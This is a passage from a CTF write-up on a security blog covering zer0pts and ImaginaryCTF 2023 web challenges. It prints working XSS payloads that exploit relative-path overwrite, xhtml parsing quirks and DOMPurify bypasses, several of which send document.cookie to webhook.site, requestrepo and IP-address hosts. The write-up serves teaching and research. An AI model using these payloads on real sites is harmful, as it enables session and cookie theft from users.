<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">var</span> linkPattern <span class="token operator">=</span> regexp<span class="token punctuation">.</span><span class="token function">MustCompile</span><span class="token punctuation">(</span><span class="token string">`\[([0-9a-f]&#123;8&#125;-[0-9a-f]&#123;4&#125;-4[0-9a-f]&#123;3&#125;-[0-9a-f]&#123;4&#125;-[0-9a-f]&#123;12&#125;)\]`</span><span class="token punctuation">)</span>

<span class="token comment">// replace [(note ID)] to links</span>
<span class="token keyword">func</span> <span class="token function">replaceLinks</span><span class="token punctuation">(</span>note <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> linkPattern<span class="token punctuation">.</span><span class="token function">ReplaceAllStringFunc</span><span class="token punctuation">(</span>note<span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>s <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span>
    id <span class="token operator">:=</span> strings<span class="token punctuation">.</span><span class="token function">Trim</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"[]"</span><span class="token punctuation">)</span>

    note<span class="token punctuation">,</span> ok <span class="token operator">:=</span> notes<span class="token punctuation">[</span>id<span class="token punctuation">]</span>
    <span class="token keyword">if</span> <span class="token operator">!</span>ok <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> s
    <span class="token punctuation">&#125;</span>

    title <span class="token operator">:=</span> html<span class="token punctuation">.</span><span class="token function">EscapeString</span><span class="token punctuation">(</span>note<span class="token punctuation">.</span>Title<span class="token punctuation">)</span>
    <span class="token keyword">return</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span>
      <span class="token string">"&lt;a href=/note/%s title=%s>%s&lt;/a>"</span><span class="token punctuation">,</span> id<span class="token punctuation">,</span> title<span class="token punctuation">,</span> title<span class="token punctuation">,</span>
    <span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// escape note to prevent XSS first, then replace newlines to &lt;br> and render links</span>
<span class="token keyword">func</span> <span class="token function">renderNote</span><span class="token punctuation">(</span>note <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">&#123;</span>
  note <span class="token operator">=</span> html<span class="token punctuation">.</span><span class="token function">EscapeString</span><span class="token punctuation">(</span>note<span class="token punctuation">)</span>
  note <span class="token operator">=</span> strings<span class="token punctuation">.</span><span class="token function">ReplaceAll</span><span class="token punctuation">(</span>note<span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">)</span>
  note <span class="token operator">=</span> <span class="token function">replaceLinks</span><span class="token punctuation">(</span>note<span class="token punctuation">)</span>
  <span class="token keyword">return</span> note
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>After sanitization, the link will be replaced. Although there is also escaping here, because the attribute is not enclosed in quotes, arbitrary attributes can be injected into the <code>a</code> tag.</p>
<p>Here, triggering XSS seems possible with <code>onanimationend</code> or <code>onfocus</code>.</p>
<p>After triggering XSS, there is another step, which is that the stolen information is deleted. However, you can use the magical <code>document.execCommand(&#39;undo&#39;);</code> to restore it.</p>
<h3><span id="scoreshare-16-solves">ScoreShare (16 solves)</span></h3><p>The core code for this challenge is as follows:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
        title <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'title'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
        abc <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'abc'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>
        link <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'link'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> title<span class="token punctuation">:</span>
            flask<span class="token punctuation">.</span>flash<span class="token punctuation">(</span><span class="token string">'Title is empty'</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> <span class="token keyword">not</span> abc<span class="token punctuation">:</span>
            flask<span class="token punctuation">.</span>flash<span class="token punctuation">(</span><span class="token string">'ABC notation is empty'</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            sid <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            db<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hset<span class="token punctuation">(</span>sid<span class="token punctuation">,</span> <span class="token string">'title'</span><span class="token punctuation">,</span> title<span class="token punctuation">)</span>
            db<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hset<span class="token punctuation">(</span>sid<span class="token punctuation">,</span> <span class="token string">'abc'</span><span class="token punctuation">,</span> abc<span class="token punctuation">)</span>
            db<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hset<span class="token punctuation">(</span>sid<span class="token punctuation">,</span> <span class="token string">'link'</span><span class="token punctuation">,</span> link<span class="token punctuation">)</span>
            <span class="token keyword">return</span> flask<span class="token punctuation">.</span>redirect<span class="token punctuation">(</span>flask<span class="token punctuation">.</span>url_for<span class="token punctuation">(</span><span class="token string">'score'</span><span class="token punctuation">,</span> sid<span class="token operator">=</span>sid<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">"upload.html"</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/score/&lt;sid>"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">score</span><span class="token punctuation">(</span>sid<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Score viewer"""</span>
    title <span class="token operator">=</span> db<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hget<span class="token punctuation">(</span>sid<span class="token punctuation">,</span> <span class="token string">'title'</span><span class="token punctuation">)</span>
    link <span class="token operator">=</span> db<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hget<span class="token punctuation">(</span>sid<span class="token punctuation">,</span> <span class="token string">'link'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> link <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        flask<span class="token punctuation">.</span>flash<span class="token punctuation">(</span><span class="token string">"Score not found"</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>redirect<span class="token punctuation">(</span>flask<span class="token punctuation">.</span>url_for<span class="token punctuation">(</span><span class="token string">'upload'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">"score.html"</span><span class="token punctuation">,</span> sid<span class="token operator">=</span>sid<span class="token punctuation">,</span> link<span class="token operator">=</span>link<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> title<span class="token operator">=</span>title<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/api/score/&lt;sid>"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">api_score</span><span class="token punctuation">(</span>sid<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    abc <span class="token operator">=</span> db<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hget<span class="token punctuation">(</span>sid<span class="token punctuation">,</span> <span class="token string">'abc'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> abc <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>abort<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>Response<span class="token punctuation">(</span>abc<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>You can add a post or something similar, and there is an unintended endpoint <code>/api/score/&lt;sid&gt;</code> that directly outputs the entire <code>abc</code>. So, by adding two posts, one with JS content and the other with <code>&lt;script src=...&gt;</code>, you can directly perform XSS.</p>
<p>The expected solution can be found in the author’s article: <a target="_blank" rel="noopener" href="https://ptr-yudai.hatenablog.com/#ScoreShare">zer0pts CTF 2023 Writeup</a>. By using iframe DOM clobbering and combining it with the existing functionality, prototype pollution can be achieved, and then the gadget for ABCJS can be found.</p>
<h3><span id="ringtone-14-solves">Ringtone (14 solves)</span></h3><p>This challenge is a bit complicated, so I’ll briefly summarize it. You can obtain an XSS in the Chrome extension context through DOM clobbering. Then, using <code>chrome.history.search</code>, you can retrieve the flag URL and obtain the flag.</p>
<p>Author’s writeup: <a target="_blank" rel="noopener" href="https://ahmed-belkahla.me/post/zer0ptsctf2023/">Ringtone Web Challenge Writeup - Zer0pts CTF 2023</a></p>
<h3><span id="plain-blog-14-solves">Plain Blog (14 solves)</span></h3><p>This challenge is a blog app. You need permission to retrieve the flag, and to have this permission, your post must have more than 1_000_000_000_000 likes. However, it is clear that the website blocks the maximum number of likes, so it is impossible to reach such a high number.</p>
<p>The solution lies in a frontend prototype pollution vulnerability. By exploiting this vulnerability, you can contaminate the parameters of the fetch request and include the <code>X-HTTP-Method-Override: PUT</code> header, allowing the admin bot to directly call another API and obtain the permission.</p>
<h2><span id="imaginaryctf-2023">ImaginaryCTF 2023</span></h2><h3><span id="sanitized-5-solves">Sanitized (5 solves)</span></h3><p>The code for this challenge is quite short, and one thing worth noting is that the CSP is set to <code>default-src &#39;self&#39;</code>. Additionally, there is a path in Express:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Page </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>req<span class="token punctuation">.</span>path<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> not found</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>It can be seen that the response from this path needs to be used as a script to execute.</p>
<p>On the frontend side, it is a classic call to DOMPurify:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span>
<span class="token keyword">const</span> html <span class="token operator">=</span> params<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>html<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> html
  document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'display'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> DOMPurify<span class="token punctuation">.</span><span class="token function">sanitize</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>When loading <code>main.js</code> in <code>index.xhtml</code>, it uses a relative path: <code>&lt;script src=&quot;main.js&quot;&gt;&lt;/script&gt;</code>.</p>
<p>Let’s first look at the unintended solution, which is quite interesting.</p>
<p>The unintended solution is to make the bot load this path: <code>/1;var[Page]=[1];location=location.hash.slice(1)+document.cookie//asd%2f..%2f..%2findex.xhtml#https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?</code></p>
<p>This exploits RPO (Relative Path Overwrite) to cause mischief. For the backend, <code>%2f</code> is interpreted as <code>/</code>, so this URL loads <code>index.xhtml</code> without any issues.</p>
<p>However, for the browser, the current path becomes <code>1;var[Page]=[1];location=location.hash.slice(1)+document.cookie//</code>, so it will load <code>/1;var[Page]=[1];location=location.hash.slice(1)+document.cookie//main.js</code>. According to Express’s route, the response will be:</p>
<pre class="line-numbers language-none"><code class="language-none">Page &#x2F;1;var[Page]&#x3D;[1];location&#x3D;location.hash.slice(1)+document.cookie&#x2F;&#x2F;main.js not found<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>The first line <code>Page /1</code> does not throw a “variable is not defined” error because of the hoisting of <code>var [Page]=[1]</code>, and the last line <code>main.js not found</code> is turned into a comment by the preceding <code>//</code>, so the middle part is executed, and the cookie is stolen.</p>
<p>This operation is really cool.</p>
<h3><span id="sanitized-revenge-3-solves">Sanitized Revenge (3 solves)</span></h3><p>This question fixes the unintended behavior, so let’s take a look at the expected solution.</p>
<p>First and foremost, the important point of this question is that the webpage is xhtml, not html, so the browser’s parsing behavior will be different.</p>
<p>For example, the payload provided by the author:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span>&lt;![CDATA[<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">data-x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>]]＞&lt;/style>&lt;iframe name='Page' />&lt;base href='/**/+location.assign(document.all.url.textContent+document.cookie)//' />&lt;style>&lt;!--<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">--></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>will be parsed by the HTML parser as a style tag + a div with the <code>data-x</code> attribute, so DOMPurify won’t do anything, and this is valid HTML.</p>
<p>But because we are in xhtml, the CDATA part becomes something that looks like a comment, so after removing it, it becomes:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>Page<span class="token punctuation">'</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>base</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>/**/+location.assign(document.all.url.textContent+document.cookie)//<span class="token punctuation">'</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--">&lt;/div>&lt;style>--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>The iframe and base that were originally inside the attribute come out.</p>
<p>We need the base because when we encounter CSP like <code>script-src &#39;self&#39;</code>, the first instinct is to use <code>&lt;iframe srcdoc&gt;</code> with a script gadget to bypass it. However, in this question, due to the limitation of xhtml, <code>&lt;</code> cannot be present in attributes, so we need to use the upcoming <code>report.js</code> together with base to change the path.</p>
<p>In the <a target="_blank" rel="noopener" href="https://github.com/maple3142/My-CTF-Challenges/tree/master/ImaginaryCTF%202023/Sanitized%20Revenge">author’s writeup</a>, there are several other solutions given, each of which is quite interesting.</p>
<p>The first one takes advantage of the fact that HTML ignores <code>&lt;!--</code> inside style tags, but xhtml doesn’t, to create a difference:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css"><span class="token selector">a</span> <span class="token punctuation">&#123;</span> <span class="token property">color</span><span class="token punctuation">:</span> &lt;!--<span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>-->&lt;/style>&lt;base href='/(document.location=/http:/.source.concat(String.fromCharCode(47)).concat(String.fromCharCode(47)).concat(/cb6c5dql.requestrepo.com/.source).concat(String.fromCharCode(47)).concat(document.cookie));var[Page]=[1]//x/' /><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>The second one exploits the fact that DOMPurify checks for valid HTML tags when detecting mXSS, which need to be ASCII alphanumeric, but XML actually allows more characters:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">a<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">&lt;<span class="token property">ø</span><span class="token punctuation">:</span>base id=<span class="token string">"giotino"</span> <span class="token property">xmlns</span><span class="token punctuation">:</span>ø=<span class="token string">"http://www.w3.org/1999/xhtml"</span> href=<span class="token string">"/**/=1;alert(document.cookie);//"</span> /></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>So it’s fine in an HTML context, but in xhtml, it will still be parsed as a base tag.</p>
<p>The third one looks similar to the first one, but the first one is much simpler. It goes like this:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">ff<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--&lt;/style>&lt;a id="--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>base</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>/**/;var/**/Page;window.name=document.cookie;document.location.host=IPV4_ADDRESS_IN_INTEGER_FORM_REDACTED//<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>base</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--">&lt;/a>&lt;style>&amp;lt;k&lt;/style>&lt;style>--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>In HTML, it’s just a style tag + an a tag + two style tags. But in xhtml, the <code>&lt;!-- --&gt;</code> inside the style is also considered a comment, so it becomes:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">ff<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">&lt;base href=<span class="token string">'/**/;var/**/Page;window.name=document.cookie;document.location.host=IPV4_ADDRESS_IN_INTEGER_FORM_REDACTED//'</span>>&lt;/base></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>From the desired effect he wants to achieve, it seems that it can be simplified like this:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">ff<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--&lt;/style>&lt;a id="--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>base</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>/**/;var/**/Page;window.name=document.cookie;document.location.host=IPV4_ADDRESS_IN_INTEGER_FORM_REDACTED//<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>base</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--">&lt;/a>&lt;style>--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

    
    </div>
    
    <div class="columns is-variable is-1 is-multiline is-mobile">
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/en/tags/Security/">#Security</a></span>
    
    </div>
    
    
    <div class="columns is-mobile is-multiline article-nav">
        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
            
            <a href="/2023/08/29/en/intigriti-0823-author-writeup/">Math jail - Intigriti 0823 XSS Challenge Author Writeup</a>
            
        </span>
        <span class="column is-12-mobile is-half-desktop  article-nav-next">
            
            <a href="/2023/06/22/en/ejs-render-vulnerability-ctf/">EJS Vulnerabilities in CTF</a>
            
        </span>
    </div>
    
</article>




<div class="comments">
    <h3 class="title is-4">Comments</h3>
    <script src="https://utteranc.es/client.js"
        repo="aszx87410/huli-blog"
        issue-term="title"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script>
</div>

    </div>
</section>
    <footer class="footer">
    <div class="container">
        <div class="columns content">
            <div class="column is-narrow has-text-centered">
                &copy; 2024 Huli&nbsp;
                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
            </div>
            <div class="column is-hidden-mobile"></div>

            
            <div class="column is-narrow">
                <div class="columns is-mobile is-multiline is-centered">
                
                    
                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
                    
                    GitHub
                    
                </a>
                
                </div>
            </div>
            
            
<div class="column is-narrow has-text-centered">
    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
        <div class="dropdown-trigger">
            <button class="button is-small" aria-haspopup="true">
                <span class="icon">
                    <i class="fas fa-globe"></i>
                </span>
                <span>English</span>
                <span class="icon is-small">
            <i class="fas fa-angle-down" aria-hidden="true"></i>
          </span>
            </button>
        </div>
        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
            <div class="dropdown-content">
            <!-- NOTE: 永遠回到首頁 -->
            
                <a href="/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/" class="dropdown-item">
                    繁體中文
                </a>
            
            </div>
        </div>
    </div>
</div>

        </div>
    </div>
</footer>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>



    
    
    
    
    
    
<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
<script>
    (function ($) {
        $(document).ready(function () {
            if (typeof($.fn.lightGallery) === 'function') {
                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
            }
        });
    })(jQuery);
</script>

    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
    <style>
        .hljs {
            position: relative;
        }

        .hljs .clipboard-btn {
            float: right;
            color: #9a9a9a;
            background: none;
            border: none;
            cursor: pointer;
        }

        .hljs .clipboard-btn:hover {
          color: #8a8a8a;
        }

        .hljs > .clipboard-btn {
            display: none;
            position: absolute;
            right: 4px;
            top: 4px;
        }

        .hljs:hover > .clipboard-btn {
            display: inline;
        }

        .hljs > figcaption > .clipboard-btn {
            margin-right: 4px;
        }
    </style>
    <script>
      $(document).ready(function () {
        $('figure.hljs').each(function(i, figure) {
          var codeId = 'code-' + i;
          var code = figure.querySelector('.code');
          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
          code.id = codeId;
          copyButton.addClass('clipboard-btn');
          copyButton.attr('data-clipboard-target-id', codeId);

          var figcaption = figure.querySelector('figcaption');

          if (figcaption) {
            figcaption.append(copyButton[0]);
          } else {
            figure.prepend(copyButton[0]);
          }
        })

        var clipboard = new ClipboardJS('.clipboard-btn', {
          target: function(trigger) {
            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
          }
        });
        clipboard.on('success', function(e) {
          e.clearSelection();
        })
      })
    </script>

    
    

    



<script src="/js/script.js?v=3.js"></script>


    
</body>
</html>